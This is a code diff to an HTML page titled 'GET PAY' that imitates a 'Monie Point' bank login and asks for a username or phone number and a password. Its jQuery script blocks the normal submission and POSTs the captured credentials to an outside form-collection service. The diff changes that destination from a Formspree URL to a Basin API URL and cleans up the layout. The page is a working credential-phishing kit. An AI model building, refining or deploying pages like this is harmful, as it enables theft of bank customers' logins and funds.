@@ -5,15 +5,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>GET PAY</title>
   <link rel="stylesheet" href="style.css">
-   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
     $(document).ready(function() {
       $('form').submit(function(event) {
         event.preventDefault(); // Prevent form submission
 
-        // Send the form data to FormSubmit using AJAX
+        // Send the form data to Basin using AJAX
         $.ajax({
-          url: 'https://formspree.io/f/moqgaypd',
+          url: 'https://api.bsn.io/submit/784f1b3f1e7a55090e8e738dd033cd7d', // Replace with your Basin API
           method: 'POST',
           data: $('form').serialize(),
           dataType: 'json',
@@ -38,21 +38,22 @@
   <header>
     
   </header>
-<img src="logo.png" alt="Bank Logo" class="logo">
-<div class="welcome-text"><b>Login to </p>
-	Monie Point</b></div>
- <main>
+  <img src="logo.png" alt="Bank Logo" class="logo">
+  <div class="welcome-text"><b>Login to Monie Point</b></div>
+  <main>
     <img src="image3.JPG" alt="Loan Image" class="loan-image" width="max" align="center">
     <form>
       <div class="form-group">
         <input type="text" id="username" name="username" placeholder="Username or Phone Number" required>
       </div>
+      <div class="form-group">
         <input type="password" id="password" name="password" placeholder="Password" required>
       </div>
-	  <center>
-	 </br>
-	 </br>
-  <center>    <button type="submit" class="submit-btn">LOGIN</button></center>
+      <center>
+        <br>
+        <br>
+        <button type="submit" class="submit-btn">LOGIN</button>
+      </center>
     </form>
   </main>
 </body>
